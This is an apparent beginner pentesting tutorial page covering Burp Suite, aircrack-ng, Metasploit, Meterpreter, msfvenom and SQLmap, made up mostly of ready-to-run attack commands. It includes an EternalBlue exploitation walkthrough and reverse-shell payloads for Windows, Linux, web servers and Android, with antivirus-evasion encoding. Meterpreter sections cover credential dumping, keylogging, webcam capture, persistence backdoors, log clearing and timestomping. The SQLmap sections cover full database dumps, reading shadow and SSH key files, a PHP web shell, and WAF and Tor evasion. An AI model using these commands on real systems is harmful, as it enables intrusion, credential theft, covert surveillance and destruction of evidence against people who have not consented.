                <strong>3. Manual Testing (2 hours):</strong><br>
                • <code>Proxy → Intercept</code>: Modify live requests<br>
                • <code>Repeater</code>: Test SQLi, XSS, IDOR, XXE<br>
                • <code>Decoder</code>: Decode JWT, Base64, URL encoding<br>
                • <code>Comparer</code>: Find boolean-based SQLi<br><br>
                <strong>4. Automated Testing (1 hour):</strong><br>
                • <code>Intruder</code>: Brute force logins, fuzz parameters<br>
                • <code>Scanner (Pro)</code>: Active scan for vulns<br>
                • <code>Extensions</code>: Autorize (authz), Param Miner (hidden params)<br><br>
                <strong>5. Exploitation (varies):</strong><br>
                • SQLmap integration: Right-click → "Copy to file" → <code>sqlmap -r request.txt</code><br>
                • XSS: Test in Repeater, escalate to account takeover<br>
                • IDOR: Script to enumerate all IDs<br>
                • SSRF: Blind SSRF with Burp Collaborator<br><br>
                <strong>6. Reporting:</strong><br>
                • Target → Site map → Report selected issues<br>
                • Export: HTML report with screenshots<br>
                • Document: Request/response, impact, remediation<br><br>
                <strong>Pro tips:</strong><br>
                • <strong>Match and Replace:</strong> Auto-modify requests (Proxy → Options → Match and Replace)<br>
                • <strong>Scope:</strong> Define target scope (Target → Scope) to focus testing<br>
                • <strong>Session handling:</strong> Auto-update tokens (Project Options → Sessions)<br>
                • <strong>Collaborator:</strong> Detect blind SSRF, XXE, OAST (Burp → Collaborator client)<br>
                • <strong>Hotkeys:</strong> Ctrl+R (Repeater), Ctrl+I (Intruder), Ctrl+Shift+B (Base64 decode)<br>
                • <strong>Save state:</strong> Project → Save (preserve all work!)<br><br>
                Burp Suite is THE web pentesting platform. Master it = find ALL web vulnerabilities! 🌐🔍</p>
            </div>

            <h4>BloodHound (Active Directory Attack Path Visualization)</h4>

            <p><strong>What is it?</strong> BloodHound is THE tool for Active Directory enumeration and attack path discovery. It uses graph theory to find hidden relationships and privilege escalation paths. Essential for AD pentesting!</p>

            <div class="code"># ========== AIRCRACK-NG ==========
# Category: Wireless Attacks
# Purpose: Complete WiFi cracking suite (WEP, WPA/WPA2)

# Install (pre-installed in Kali):
sudo apt install aircrack-ng

# Key tools in suite:
# - airmon-ng   → Enable monitor mode
# - airodump-ng → Capture packets
# - aireplay-ng → Inject packets, deauth
# - aircrack-ng → Crack captured handshakes

# Basic workflow (see Bonus Part 1 for detailed guide):
sudo airmon-ng start wlan0        # Enable monitor mode → wlan0mon
sudo airodump-ng wlan0mon         # Scan for networks
sudo airodump-ng -c 6 --bssid [MAC] -w capture wlan0mon  # Capture handshake
sudo aireplay-ng -0 5 -a [AP_MAC] wlan0mon               # Deauth to force handshake
aircrack-ng -w wordlist.txt capture-01.cap               # Crack handshake

# ========== AMASS ==========
# Category: Information Gathering
# Purpose: Subdomain enumeration (passive + active)

sudo apt install amass

# Passive enumeration (no target contact):
amass enum -passive -d company.com

# Active enumeration (includes DNS brute force):
amass enum -active -d company.com -brute -w subdomains.txt

# Output to file:
amass enum -d company.com -o subdomains.txt

# Use with other tools:
amass enum -d company.com | httprobe > live_subdomains.txt

# ========== ARMITAGE ==========
# Category: Exploitation Tools
# Purpose: GUI for Metasploit (team collaboration)

sudo apt install armitage

# Launch (requires Metasploit database):
sudo msfdb init        # First time only
sudo armitage

# Features:
# - Point-and-click exploit selection
# - Visual network map
# - Team server for collaboration
# - Automated exploitation workflows

# Use case: Red team engagements with multiple operators

# ========== AUTOPSY ==========
# Category: Forensics
# Purpose: Digital forensics platform (GUI for Sleuthkit)
# See Section 1 for detailed guide

sudo apt install autopsy

# Launch:
autopsy

# Web interface: http://localhost:9999/autopsy

# Create case → Add image → Analyze!

# ========== AWK (Pattern Scanning) ==========
# Category: Utility
# Purpose: Text processing, log analysis

# Extract specific columns from output:
cat access.log | awk '{print $1}'    # Print first column (IP addresses)

# Filter by condition:
netstat -an | awk '/ESTABLISHED/ {print $5}'  # Show established connections

# Sum values:
cat numbers.txt | awk '{sum += $1} END {print sum}'

# Use case: Parse nmap output, extract IPs from logs</div>

            <h3>B-Tools</h3>

            <div class="code"># Start Metasploit:
msfconsole
# Loads: Framework, exploits, payloads, auxiliary modules

# BEGINNER EXPLANATION:
# Metasploit has 5 module types:
# 1. EXPLOITS   → Take advantage of vulnerabilities
# 2. PAYLOADS   → Code that runs after exploitation (reverse shell, meterpreter)
# 3. AUXILIARY  → Scanners, fuzzers, DoS tools
# 4. POST       → Post-exploitation (after you have shell)
# 5. ENCODERS   → Obfuscate payloads (evade antivirus)

# Update Metasploit:
msfupdate
# Downloads latest exploits and modules

# Search for exploits:
msf6 > search eternalblue
# Finds: exploit/windows/smb/ms17_010_eternalblue

# Search with filters:
search type:exploit platform:windows smb
search cve:2021 rank:excellent
search type:auxiliary name:smb

# SEARCH FLAGS EXPLAINED:
# type:exploit     → Only show exploits
# type:auxiliary   → Only show scanners/tools
# platform:windows → Only Windows exploits
# platform:linux   → Only Linux exploits
# rank:excellent   → Only excellent rank (reliable)
# cve:2021         → Exploits for CVE-2021-XXXX

# View exploit details:
msf6 > info exploit/windows/smb/ms17_010_eternalblue
# Shows: Description, targets, options, references

# Use an exploit:
msf6 > use exploit/windows/smb/ms17_010_eternalblue
# Loads exploit module

# Show required options:
msf6 exploit(ms17_010_eternalblue) > show options
# Shows: RHOSTS, RPORT, LHOST, etc.

# Set target:
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10
# RHOSTS = Remote host (target IP)

# Set local IP (for reverse shell):
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
# LHOST = Local host (attacker IP)
# Payload connects back to THIS IP!

# Set payload:
msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
# Payload = code that executes after exploit succeeds
# reverse_tcp = connects back to attacker

# Run the exploit:
msf6 exploit(ms17_010_eternalblue) > exploit
# Or: run, or: exploit -j (background job)

# Background session:
Ctrl+Z
# Puts meterpreter session in background

# List sessions:
msf6 > sessions -l
# Shows all active shells/meterpreter sessions

# Interact with session:
msf6 > sessions -i 1
# -i 1  ← Interact with session ID 1

# Kill session:
msf6 > sessions -k 1
# -k 1  ← Kill session ID 1

# Kill all sessions:
msf6 > sessions -K</div>

            <h5>Meterpreter - Advanced Post-Exploitation</h5>

            <div class="code"># After exploitation, you get meterpreter shell:
meterpreter >

# WHAT IS METERPRETER?
# Advanced payload that runs in memory (no files on disk!)
# Features:
# - File upload/download
# - Screenshot capture
# - Keylogging
# - Privilege escalation
# - Pivoting/routing
# - Persistence
# - Process migration

# === SYSTEM INFORMATION ===

# System info:
meterpreter > sysinfo
# Shows: OS, architecture, computer name, domain

# Current user:
meterpreter > getuid
# Shows: NT AUTHORITY\\SYSTEM or domain\\username

# Network info:
meterpreter > ipconfig
# Shows: IP addresses, MAC, subnets

# Check privileges:
meterpreter > getprivs
# Shows: SeDebugPrivilege, SeImpersonatePrivilege, etc.

# === FILE SYSTEM ===

# Current directory:
meterpreter > pwd

# Change directory:
meterpreter > cd C:\\Users\\Administrator\\Desktop

# List files:
meterpreter > ls
# Shows files in current directory

# Search for files:
meterpreter > search -f passwords.txt
# -f passwords.txt  ← Search for filename

# Search in specific directory:
meterpreter > search -d C:\\Users -f *.txt
# -d C:\\Users  ← Search directory
# -f *.txt  ← Search pattern

# Download file:
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/
# Downloads to /tmp/ on attacker machine

# Upload file:
meterpreter > upload /tmp/mimikatz.exe C:\\Windows\\Temp\\
# Uploads to target

# === PROCESSES ===

# List processes:
meterpreter > ps
# Shows: PID, name, user, architecture

# Migrate to another process:
meterpreter > migrate 1337
# Moves meterpreter to PID 1337
# WHY? Stability, evade detection, get new privileges

# Kill process:
meterpreter > kill 1337

# Execute program:
meterpreter > execute -f cmd.exe -i
# -f cmd.exe  ← File to execute
# -i  ← Interact (get shell)

# === PRIVILEGE ESCALATION ===

# Attempt automatic privesc:
meterpreter > getsystem
# Tries multiple techniques:
# - Named pipe impersonation
# - Token duplication
# If successful: NT AUTHORITY\\SYSTEM!

# Check if successful:
meterpreter > getuid
# Should show: NT AUTHORITY\\SYSTEM

# === CREDENTIAL DUMPING ===

# Dump password hashes (requires SYSTEM):
meterpreter > hashdump
# Dumps: SAM hashes (NTLM)
# Output: username:RID:LM:NTLM:::

# Load mimikatz (Kiwi):
meterpreter > load kiwi
# Loads mimikatz as meterpreter module!

# Dump credentials from memory:
meterpreter > creds_all
# Dumps: Plaintext passwords, hashes, tickets

# Kerberos tickets:
meterpreter > kerberos

# === SCREENSHOT & KEYLOGGING ===

# Take screenshot:
meterpreter > screenshot
# Saves to /tmp/ on attacker machine

# Start keylogger:
meterpreter > keyscan_start
# Captures all keystrokes

# Dump captured keystrokes:
meterpreter > keyscan_dump

# Stop keylogger:
meterpreter > keyscan_stop

# === WEBCAM ===

# List webcams:
meterpreter > webcam_list

# Take photo:
meterpreter > webcam_snap
# Captures image from webcam

# Start video stream:
meterpreter > webcam_stream

# === NETWORK & PIVOTING ===

# Port forwarding:
meterpreter > portfwd add -l 4444 -p 445 -r 192.168.2.10
# -l 4444  ← Local port on attacker machine
# -p 445   ← Remote port on target
# -r 192.168.2.10  ← Remote host (internal network)
# Access: localhost:4444 → 192.168.2.10:445

# Route through compromised host:
meterpreter > run autoroute -s 192.168.2.0/24
# -s 192.168.2.0/24  ← Subnet to route
# Now can attack 192.168.2.0/24 through this host!

# Scan internal network:
meterpreter > run arp_scanner -r 192.168.2.0/24

# === PERSISTENCE ===

# Install backdoor:
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50
# -X  ← Start on boot
# -i 10  ← Connect every 10 seconds
# -p 4444  ← Port
# -r 192.168.1.50  ← Attacker IP

# === MISCELLANEOUS ===

# Shell access (cmd/bash):
meterpreter > shell
# Drops to system shell
# Exit shell: exit (returns to meterpreter)

# Clear event logs:
meterpreter > clearev
# Clears: Application, System, Security logs
# Removes evidence!

# Timestomp (modify file timestamps):
meterpreter > timestomp C:\\backdoor.exe -z "2020-01-01 00:00:00"
# Makes file look old (anti-forensics)

# Background session:
meterpreter > background
# Or: Ctrl+Z

# Exit meterpreter:
meterpreter > exit</div>

            <h5>Msfvenom - Payload Generator</h5>

            <div class="code"># Msfvenom generates custom payloads for any platform!

# === LIST AVAILABLE PAYLOADS ===

# List all payloads:
msfvenom -l payloads
# Shows 500+ payloads

# List by platform:
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep android

# List formats:
msfvenom -l formats
# Shows: exe, dll, elf, raw, python, powershell, etc.

# === WINDOWS PAYLOADS ===

# Windows reverse shell (EXE):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# FLAGS EXPLAINED FOR BEGINNERS:
# -p windows/meterpreter/reverse_tcp  ← Payload type
#    windows = Platform
#    meterpreter = Payload (advanced shell)
#    reverse_tcp = Connection type (connects TO attacker)
# LHOST=192.168.1.50  ← Attacker IP (listens here)
# LPORT=4444  ← Attacker port (listens on this port)
# -f exe  ← Output format (Windows executable)
# -o shell.exe  ← Output filename

# Windows reverse HTTPS (encrypted):
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe
# reverse_https = Encrypted connection (evade IDS!)

# Windows bind shell (target listens):
msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.1.10 LPORT=4444 -f exe -o bind_shell.exe
# bind_tcp = Target LISTENS, attacker CONNECTS
# RHOST = target IP

# Windows DLL:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll -o shell.dll
# DLL = Dynamic Link Library (for DLL hijacking)

# Windows service executable:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe-service -o service.exe
# exe-service = Runs as Windows service

# === LINUX PAYLOADS ===

# Linux reverse shell (ELF):
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# Linux bind shell:
msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=192.168.1.10 LPORT=4444 -f elf -o bind.elf

# === WEB PAYLOADS ===

# PHP reverse shell:
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
# Upload to web server!

# ASP reverse shell:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp
# For IIS web servers

# JSP reverse shell:
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp
# For Tomcat/Java web servers

# === SCRIPTING PAYLOADS ===

# Python reverse shell:
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell reverse shell:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# Bash reverse shell:
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.sh

# === ENCODING (AV EVASION) ===

# Encode payload (evade antivirus):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_shell.exe

# ENCODING FLAGS EXPLAINED:
# -e x86/shikata_ga_nai  ← Encoder (polymorphic, changes each time!)
# -i 10  ← Iterations (encode 10 times, harder to detect)
# More iterations = better evasion but larger file

# List encoders:
msfvenom -l encoders

# === SHELLCODE FORMATS ===

# Raw shellcode (for buffer overflow):
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shellcode.bin

# C array format (for exploit development):
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f c
# Output:
# unsigned char buf[] = "\\x31\\xc0\\x50\\x68...";

# Python format:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python
# Output:
# buf = b"\\x31\\xc0\\x50\\x68..."

# === MOBILE PAYLOADS ===

# Android APK:
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk
# Install on target Android device!

# === LISTENER SETUP (MSFconsole) ===

# After generating payload, set up listener:
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
# -j  ← Run as background job
# Now execute shell.exe on target → get meterpreter session!</div>

            <h5>Metasploit Auxiliary Modules - Scanners and Tools</h5>

            <div class="code"># Auxiliary modules = scanners, fuzzers, DoS tools (no exploitation)

# === PORT SCANNING ===

# TCP port scanner:
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.1-254
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,443,445,3389
msf6 auxiliary(scanner/portscan/tcp) > run

# SYN scanner (faster):
msf6 > use auxiliary/scanner/portscan/syn
msf6 auxiliary(scanner/portscan/syn) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/syn) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/syn) > run

# === SMB ENUMERATION ===

# SMB version detection:
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.1-254
msf6 auxiliary(scanner/smb/smb_version) > run
# Identifies: Windows version, SMB version

# SMB share enumeration:
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.1.10
msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBUser administrator
msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBPass Password123
msf6 auxiliary(scanner/smb/smb_enumshares) > run

# SMB user enumeration:
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 192.168.1.10
msf6 auxiliary(scanner/smb/smb_enumusers) > run

# EternalBlue vulnerability check:
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.1-254
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
# Checks for MS17-010 (EternalBlue!)

# === SSH ===

# SSH version scanner:
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ssh/ssh_version) > run

# SSH login brute force:
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.10
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run

# === FTP ===

# FTP version scanner:
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ftp/ftp_version) > run

# FTP anonymous login check:
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.1.1-254
msf6 auxiliary(scanner/ftp/anonymous) > run

# === HTTP ===

# HTTP version scanner:
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/http/http_version) > run
# Identifies: Apache, Nginx, IIS versions

# Directory scanner:
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.1.10
msf6 auxiliary(scanner/http/dir_scanner) > run

# Robots.txt scanner:
msf6 > use auxiliary/scanner/http/robots_txt
msf6 auxiliary(scanner/http/robots_txt) > set RHOSTS 192.168.1.10
msf6 auxiliary(scanner/http/robots_txt) > run

# === SNMP ===

# SNMP community scanner:
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.1-254
msf6 auxiliary(scanner/snmp/snmp_enum) > run

# === DATABASE ===

# MySQL version scanner:
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) > set RHOSTS 192.168.1.10
msf6 auxiliary(scanner/mysql/mysql_version) > run

# MySQL login brute force:
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.1.10
msf6 auxiliary(scanner/mysql/mysql_login) > set USER_FILE users.txt
msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE passwords.txt
msf6 auxiliary(scanner/mysql/mysql_login) > run

# PostgreSQL version:
msf6 > use auxiliary/scanner/postgres/postgres_version

# MSSQL version:
msf6 > use auxiliary/scanner/mssql/mssql_ping</div>

            <div class="metaphor-box">
                <h4>💡 Metasploit Framework Summary</h4>
                <p><strong>Complete Metasploit workflow:</strong><br><br>
                <strong>1. Reconnaissance (Auxiliary):</strong><br>
                • <code>auxiliary/scanner/portscan/tcp</code> → Find open ports<br>
                • <code>auxiliary/scanner/smb/smb_version</code> → Identify Windows version<br>
                • <code>auxiliary/scanner/smb/smb_ms17_010</code> → Check for EternalBlue<br><br>
                <strong>2. Exploitation:</strong><br>
                • <code>search eternalblue</code> → Find exploit<br>
                • <code>use exploit/windows/smb/ms17_010_eternalblue</code><br>
                • <code>set RHOSTS target_ip</code><br>
                • <code>set payload windows/x64/meterpreter/reverse_tcp</code><br>
                • <code>set LHOST attacker_ip</code><br>
                • <code>exploit</code> → Get meterpreter!<br><br>
                <strong>3. Post-Exploitation (Meterpreter):</strong><br>
                • <code>getsystem</code> → Escalate to SYSTEM<br>
                • <code>hashdump</code> → Dump password hashes<br>
                • <code>load kiwi</code> + <code>creds_all</code> → Dump credentials<br>
                • <code>screenshot</code> → Capture screenshot<br>
                • <code>keyscan_start</code> → Start keylogger<br>
                • <code>run autoroute -s 192.168.2.0/24</code> → Pivot to internal network<br>
                • <code>run persistence</code> → Maintain access<br><br>
                <strong>4. Payload Generation (Msfvenom):</strong><br>
                • Windows: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe</code><br>
                • Linux: <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf</code><br>
                • PHP: <code>msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php</code><br>
                • Android: <code>msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o shell.apk</code><br><br>
                <strong>Key concepts:</strong><br>
                • <strong>Exploit:</strong> Takes advantage of vulnerability<br>
                • <strong>Payload:</strong> Code that runs after exploit (meterpreter, shell)<br>
                • <strong>LHOST:</strong> Local host (attacker IP for reverse shell)<br>
                • <strong>RHOST:</strong> Remote host (target IP)<br>
                • <strong>Meterpreter:</strong> Advanced payload with file transfer, pivoting, persistence<br>
                • <strong>Sessions:</strong> Active connections (shells/meterpreter)<br><br>
                <strong>Pro tips:</strong><br>
                • Always use <code>-j</code> for background jobs<br>
                • <code>sessions -l</code> to list all sessions<br>
                • <code>sessions -i 1</code> to interact with session<br>
                • <code>search rank:excellent</code> for reliable exploits<br>
                • <code>exploit/multi/handler</code> for custom payloads<br>
                • Learn: <strong>Offensive Security's Metasploit Unleashed (free!)</strong><br><br>
                Metasploit = #1 exploitation framework. Master it = exploit anything! 💣🎯</p>
            </div>

            <h4>SQLmap (THE Automatic SQL Injection Tool)</h4>

            <p><strong>What is it?</strong> SQLmap is THE industry-standard automated SQL injection tool. It detects and exploits SQL injection vulnerabilities in web applications. Supports 20+ database types, has 100+ options, and can take over entire databases automatically!</p>

            <h5>Basic SQL Injection Testing</h5>

            <div class="code"># Simplest test (single URL with parameter):
sqlmap -u "http://target.com/page.php?id=1"

# BEGINNER EXPLANATION:
# SQLmap tests the 'id' parameter for SQL injection
# It tries different injection payloads automatically
# If vulnerable, it exploits and gives you database access!

# Test POST data:
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"
# --data  ← POST parameters to test

# Test from Burp Suite request file:
sqlmap -r request.txt
# -r request.txt  ← Load HTTP request from file
# How to get request.txt:
# 1. Burp Suite → Proxy → Intercept request
# 2. Right-click → Copy to file → Save as request.txt
# 3. Run sqlmap -r request.txt

# Test specific parameter:
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id
# -p id  ← Only test 'id' parameter (faster!)

# Test cookie:
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123; user_id=5"
# --cookie  ← Include cookies (for authenticated pages)

# Test headers:
sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: 127.0.0.1"
# --headers  ← Custom HTTP headers

# User-Agent:
sqlmap -u "http://target.com/page.php" --user-agent="Mozilla/5.0"
# --user-agent  ← Custom User-Agent string</div>

            <h5>Database Enumeration - Extract Data</h5>

            <div class="code"># === STEP-BY-STEP DATABASE EXTRACTION ===

# Step 1: List all databases
sqlmap -u "http://target.com/page.php?id=1" --dbs
# --dbs  ← List all database names
# Output: information_schema, mysql, webapp_db, etc.

# Step 2: List tables in specific database
sqlmap -u "http://target.com/page.php?id=1" -D webapp_db --tables
# -D webapp_db  ← Select database 'webapp_db'
# --tables  ← List all tables in this database
# Output: users, products, orders, admin, etc.

# Step 3: List columns in specific table
sqlmap -u "http://target.com/page.php?id=1" -D webapp_db -T users --columns
# -T users  ← Select table 'users'
# --columns  ← List all column names
# Output: id, username, password, email, role, etc.

# Step 4: Dump data from specific columns
sqlmap -u "http://target.com/page.php?id=1" -D webapp_db -T users -C username,password --dump
# -C username,password  ← Select specific columns
# --dump  ← Extract all data from these columns!
# Output: Saves to CSV file with usernames + password hashes!

# Dump entire table:
sqlmap -u "http://target.com/page.php?id=1" -D webapp_db -T users --dump
# Dumps ALL columns from 'users' table

# Dump entire database:
sqlmap -u "http://target.com/page.php?id=1" -D webapp_db --dump-all
# --dump-all  ← Dump EVERYTHING in database!

# Get current database:
sqlmap -u "http://target.com/page.php?id=1" --current-db
# --current-db  ← Show which database the web app uses

# Get current user:
sqlmap -u "http://target.com/page.php?id=1" --current-user
# --current-user  ← Show database username (e.g., 'webapp_user@localhost')

# Check if user is DBA:
sqlmap -u "http://target.com/page.php?id=1" --is-dba
# --is-dba  ← Check if current user has admin privileges
# If TRUE = you can execute OS commands!</div>

            <h5>Advanced Exploitation - OS Command Execution</h5>

            <div class="code"># === FILE SYSTEM ACCESS ===

# Read file from server:
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
# --file-read  ← Read file from server
# Saved locally for analysis!

# Common files to read:
# Linux:
#   /etc/passwd  ← User accounts
#   /etc/shadow  ← Password hashes (if DBA!)
#   /var/www/html/config.php  ← Database credentials
#   /root/.ssh/id_rsa  ← SSH private key
# Windows:
#   C:\\Windows\\System32\\drivers\\etc\\hosts
#   C:\\inetpub\\wwwroot\\web.config  ← Database creds
#   C:\\Users\\Administrator\\Desktop\\passwords.txt

# Write file to server (web shell!):
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
# --file-write  ← Local file to upload
# --file-dest  ← Remote path where file will be written
# Example shell.php:
# <?php system($_GET['cmd']); ?>
# Access: http://target.com/shell.php?cmd=whoami

# === OS COMMAND EXECUTION ===

# Get OS shell:
sqlmap -u "http://target.com/page.php?id=1" --os-shell
# --os-shell  ← Interactive OS command shell!
# Requires: DBA privileges OR file write access
# You get: Full shell access!
# Commands:
# os-shell> whoami
# os-shell> cat /etc/passwd
# os-shell> ls -la

# Execute single command:
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"
# --os-cmd  ← Execute one OS command

# Get SQL shell:
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
# --sql-shell  ← Interactive SQL query interface
# Run ANY SQL query:
# sql-shell> SELECT * FROM users;
# sql-shell> CREATE TABLE backdoor ...;</div>

            <h5>Performance & Stealth Options</h5>

            <div class="code"># === SPEED & THREADS ===

# Multi-threading (faster!):
sqlmap -u "http://target.com/page.php?id=1" --threads=10
# --threads=10  ← Use 10 concurrent threads
# Default: 1 thread
# Max recommended: 10 (more = may crash app)

# Increase delay between requests (stealth):
sqlmap -u "http://target.com/page.php?id=1" --delay=3
# --delay=3  ← Wait 3 seconds between requests
# Use for: Evading rate limiting, IDS evasion

# Randomize delay:
sqlmap -u "http://target.com/page.php?id=1" --delay=2-5
# Random delay between 2-5 seconds

# === TECHNIQUE SELECTION ===

# Specify injection technique:
sqlmap -u "http://target.com/page.php?id=1" --technique=B
# --technique  ← Injection techniques to use:
#   B = Boolean-based blind
#   E = Error-based
#   U = UNION query-based
#   S = Stacked queries
#   T = Time-based blind
#   Q = Inline queries
# Default: BEUSTQ (tries all)

# Fast scan (Boolean + Time only):
sqlmap -u "http://target.com/page.php?id=1" --technique=BT

# UNION-based only (fastest if works):
sqlmap -u "http://target.com/page.php?id=1" --technique=U

# === RISK & LEVEL ===

# Increase test level (more thorough):
sqlmap -u "http://target.com/page.php?id=1" --level=5
# --level=1-5  ← Test thoroughness
#   1 = Default (fast, basic tests)
#   2 = Also test cookies
#   3 = Also test User-Agent, Referer headers
#   4 = More payload variations
#   5 = Maximum tests (SLOW but complete!)

# Increase risk (more aggressive payloads):
sqlmap -u "http://target.com/page.php?id=1" --risk=3
# --risk=1-3  ← Payload aggressiveness
#   1 = Safe (won't harm database)
#   2 = Medium (heavy queries)
#   3 = Maximum (may cause damage, DoS!)

# Aggressive full scan:
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --threads=10
# Slowest but finds EVERYTHING!</div>

            <h5>Bypass Techniques - Evade WAF/IDS</h5>

            <div class="code"># === WAF BYPASS ===

# Tamper scripts (obfuscate payloads):
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
# --tamper  ← Use tamper script to modify payloads
# space2comment: Replaces spaces with /**/ comments
# Original: SELECT * FROM users
# Tampered: SELECT/**/FROM/**/users

# List all tamper scripts:
sqlmap --list-tampers
# Popular tampers:
#   space2comment  ← Replace spaces
#   between  ← Replace > with BETWEEN
#   charencode  ← URL encode characters
#   charunicodeencode  ← Unicode encoding
#   randomcase  ← RaNdOm CaSe
#   space2plus  ← Replace spaces with +
#   versionedmorekeywords  ← Add version comments
#   base64encode  ← Base64 encode

# Multiple tamper scripts:
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase

# Random User-Agent:
sqlmap -u "http://target.com/page.php?id=1" --random-agent
# --random-agent  ← Use random User-Agent header
# Evades: User-Agent-based filtering

# HTTP Authentication:
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"
# --auth-type  ← Basic, Digest, or NTLM
# --auth-cred  ← username:password

# Proxy:
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
# --proxy  ← Route through proxy (Burp Suite!)
# View all requests in Burp!

# Tor:
sqlmap -u "http://target.com/page.php?id=1" --tor
# --tor  ← Route through Tor network (anonymity!)
# Must have Tor running: sudo systemctl start tor

# === BYPASS NULL BYTES ===

# Add null byte suffix:
sqlmap -u "http://target.com/page.php?id=1" --suffix="%00"
# --suffix  ← Append to every payload
# Bypasses: Some WAF filters

# Add prefix:
sqlmap -u "http://target.com/page.php?id=1" --prefix="') OR 1=1--"
# --prefix  ← Prepend to payload</div>

            <h5>Output & Session Management</h5>

